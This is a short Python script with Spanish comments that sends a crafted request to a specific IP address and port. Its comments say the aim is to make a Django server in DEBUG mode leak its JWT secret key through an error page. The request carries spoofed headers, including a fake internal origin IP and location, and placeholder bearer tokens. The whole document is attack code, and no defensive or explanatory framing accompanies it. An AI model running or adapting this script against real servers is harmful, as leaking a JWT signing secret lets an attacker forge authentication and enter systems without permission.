# Vamos a intentar que Django tire su JWT_SECRET_KEY desde error de middleware
import requests

session = requests.Session()
session.headers.update({
    "Host": "80.78.30.242",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,application/json",
    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7,fr;q=0.5",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-ES-9181",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/json",
    "Authorization": "Bearer dummy_token_here",
    "X-Token-ID": "dummy_token_here"
})

# === Inyectamos el error desde Django ===
# Si el sistema está en DEBUG=True, te devuelve el token error con su firma
session.get("http://80.78.30.242:9181/api/challenge/verify/?token=dummy_jwt")